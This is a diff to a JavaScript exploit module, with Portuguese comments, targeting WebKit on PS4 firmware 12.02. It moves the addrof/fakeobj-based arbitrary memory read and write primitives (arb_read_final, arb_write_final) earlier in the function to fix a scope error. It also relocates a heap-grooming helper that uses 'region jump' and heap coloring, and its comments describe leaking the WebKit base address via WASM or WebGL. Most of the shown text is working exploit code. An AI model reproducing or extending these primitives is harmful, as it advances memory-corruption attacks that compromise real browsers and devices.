@@ -1,10 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v119 - R79 com Salto de Região e Coloring)
+// js/script3/testArrayBufferVictimCrash.mjs (v120 - R80 - Fix de Escopo arb_write_final)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Implementa a "Técnica de Salto de Região" e "Heap Coloring" simplificado
-// para contornar a reutilização agressiva de heap no PS4 12.02.
-// - Objetivo: Forçar alocações de objetos críticos em regiões de memória "limpas"
-//   ou com padrões controlados, para permitir o vazamento de ponteiros reais.
+// Corrigido o erro de escopo 'arb_write_final is not defined' movendo a definição das
+// primitivas de leitura/escrita arbitrária para o início da função principal.
+// Mantém as estratégias de alocação diferenciada, salto de região e coloração de heap.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -16,7 +15,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v119_R79_RegionJumpColor";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v120_R80_RWFinalScopeFix";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -91,7 +90,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
     };
 
-    // --- DEFINIÇÃO DE ADDROF/FAKEOBJ AQUI (Escopo Global da Função) ---
+    // --- DEFINIÇÃO DE ADDROF/FAKEOBJ E ARB_READ/ARB_WRITE AQUI (Escopo Global da Função) ---
+    // Mover essas definições para o início para garantir que estejam disponíveis para todas as fases.
     const confused_array = [13.37];
     const victim_array = [{ a: 1 }];
     const addrof = (obj) => {
@@ -106,47 +106,24 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`  fakeobj(${addr.toString(true)}) -> Object`, "debug");
         return obj;
     };
-    // -------------------------------------------------------------------
 
-    // --- Auxiliar para alocar em "região limpa" usando Salto de Região ---
-    async function allocateInCleanRegion(size_bytes, color_pattern = null) {
-        logS3(`  [allocateInCleanRegion] Tentando alocar objeto de ${toHex(size_bytes)} bytes em região "limpa"...`, "debug");
-        // 1. Alocar objeto sentinela do mesmo tamanho
-        let sentinel = new ArrayBuffer(size_bytes);
-        let sentinelAddr = addrof(sentinel);
-        logS3(`    [allocateInCleanRegion] Sentinela alocada em ${sentinelAddr.toString(true)}.`, "debug");
-
-        // 2. Opcional: Colorir a memória do sentinela
-        if (color_pattern && isAdvancedInt64Object(color_pattern)) {
-             try {
-                // Arb_write_final opera em 8 bytes. Preencher com o padrão.
-                for (let i = 0; i < size_bytes; i += 8) {
-                    await arb_write_final(sentinelAddr.add(i), color_pattern);
-                }
-                logS3(`    [allocateInCleanRegion] Sentinela colorida com ${color_pattern.toString(true)}.`, "debug");
-             } catch (color_err) {
-                 logS3(`    [allocateInCleanRegion] Erro ao colorir sentinela: ${color_err.message}`, "warn");
-             }
-        }
-        
-        // 3. Liberar sentinela para criar um "buraco"
-        sentinel = null;
-        // Tentar forçar o GC imediatamente, embora no PS4 ele seja conservador
-        await PAUSE_S3(50); // Pequena pausa para permitir agendamento do GC
-        logS3(`    [allocateInCleanRegion] Sentinela liberada.`, "debug");
-        
-        // 4. Forçar GC (chamada não padrão, mas útil em alguns ambientes)
-        // if (typeof gc === 'function') gc(); // Descomentar se gc() estiver disponível
-
-        await PAUSE_S3(100); // Pausa para permitir que o buraco seja "registrado"
-        logS3(`    [allocateInCleanRegion] Tentando alocar objeto real no "buraco"...`, "debug");
-
-        // Aloca o objeto real (neste caso, retorna null para indicar que a alocação é externa)
-        // A função que chama `allocateInCleanRegion` é responsável por alocar o WASM ou WebGL de fato.
-        // O objetivo aqui é apenas "preparar" um buraco.
-        return true; // Indica que o processo de salto foi iniciado.
-    }
-
+    // Estas primitivas dependem de addrof/fakeobj, mas precisam ser definidas cedo.
+    const arb_read_final = (addr) => {
+        logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
+        leaker.obj_prop = fakeobj(addr);
+        const result = doubleToInt64(leaker.val_prop);
+        logS3(`    arb_read_final: Lido ${result.toString(true)} de ${addr.toString(true)}`, "debug");
+        return result;
+    };
+    const arb_write_final = (addr, value) => {
+        logS3(`    arb_write_final: Preparando para escrever ${value.toString(true)} em ${addr.toString(true)}`, "debug");
+        leaker.obj_prop = fakeobj(addr);
+        leaker.val_prop = int64ToDouble(value);
+        logS3(`    arb_write_final: Escrita concluída em ${addr.toString(true)}`, "debug");
+    };
+    // O 'leaker' também precisa ser definido cedo, pois é usado por arb_read_final/arb_write_final.
+    const leaker = { obj_prop: null, val_prop: 0 };
+    // -------------------------------------------------------------------------------------
 
     try {
         // --- FASE 1: Alocação Pioneira de WebAssembly (Antes da Poluição de L/E) ---
@@ -155,6 +132,40 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         let wasm_instance_addr = null;
 
         const WASM_INSTANCE_SIZE_HINT = 0x120; // Tamanho típico de uma instância WASM (em bytes)
+
+        // --- Auxiliar para alocar em "região limpa" usando Salto de Região ---
+        async function allocateInCleanRegion(size_bytes, color_pattern = null) {
+            logS3(`  [allocateInCleanRegion] Tentando alocar objeto de ${toHex(size_bytes)} bytes em região "limpa"...`, "debug");
+            // 1. Alocar objeto sentinela do mesmo tamanho
+            let sentinel = new ArrayBuffer(size_bytes);
+            let sentinelAddr = addrof(sentinel);
+            logS3(`    [allocateInCleanRegion] Sentinela alocada em ${sentinelAddr.toString(true)}.`, "debug");
+
+            // 2. Opcional: Colorir a memória do sentinela
+            if (color_pattern && isAdvancedInt64Object(color_pattern)) {
+                 try {
+                    // Arb_write_final opera em 8 bytes. Preencher com o padrão.
+                    for (let i = 0; i < size_bytes; i += 8) {
+                        await arb_write_final(sentinelAddr.add(i), color_pattern);
+                    }
+                    logS3(`    [allocateInCleanRegion] Sentinela colorida com ${color_pattern.toString(true)}.`, "debug");
+                 } catch (color_err) {
+                     logS3(`    [allocateInCleanRegion] Erro ao colorir sentinela: ${color_err.message}`, "warn");
+                 }
+            }
+            
+            // 3. Liberar sentinela para criar um "buraco"
+            sentinel = null;
+            // Tentar forçar o GC imediatamente, embora no PS4 ele seja conservador
+            await PAUSE_S3(50); // Pequena pausa para permitir agendamento do GC
+            logS3(`    [allocateInCleanRegion] Sentinela liberada.`, "debug");
+            
+            await PAUSE_S3(100); // Pausa para permitir que o buraco seja "registrado"
+            logS3(`    [allocateInCleanRegion] Tentando alocar objeto real no "buraco"...`, "debug");
+
+            return true; // Indica que o processo de salto foi iniciado.
+        }
+
 
         try {
             // ** Heap Feng Shui Agressivo (antes do WASM) **
@@ -222,22 +233,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
-        const leaker = { obj_prop: null, val_prop: 0 };
-        const leaker_addr = addrof(leaker);
-        
-        const arb_read_final = (addr) => {
-            logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
-            leaker.obj_prop = fakeobj(addr);
-            const result = doubleToInt64(leaker.val_prop);
-            logS3(`    arb_read_final: Lido ${result.toString(true)} de ${addr.toString(true)}`, "debug");
-            return result;
-        };
-        const arb_write_final = (addr, value) => {
-            logS3(`    arb_write_final: Preparando para escrever ${value.toString(true)} em ${addr.toString(true)}`, "debug");
-            leaker.obj_prop = fakeobj(addr);
-            leaker.val_prop = int64ToDouble(value);
-            logS3(`    arb_write_final: Escrita concluída em ${addr.toString(true)}`, "debug");
-        };
+        // 'leaker' e primitivas arb_read_final/arb_write_final já foram definidas acima, antes do try-catch principal.
         logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");
 
 
@@ -335,7 +331,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         }
 
 
-        // --- FASE 6: Tentativa de Vazamento via WebGL (Se WASM falhar) ---
+        // --- FASE 6: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT VIA WEBGL (Se WASM falhar) ---
         logS3("--- FASE 6: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT VIA WEBGL (Backup) ---", "subtest");
 
         // Alocação e limpeza específica para WebGL (tamanho diferente de WASM e L/E)
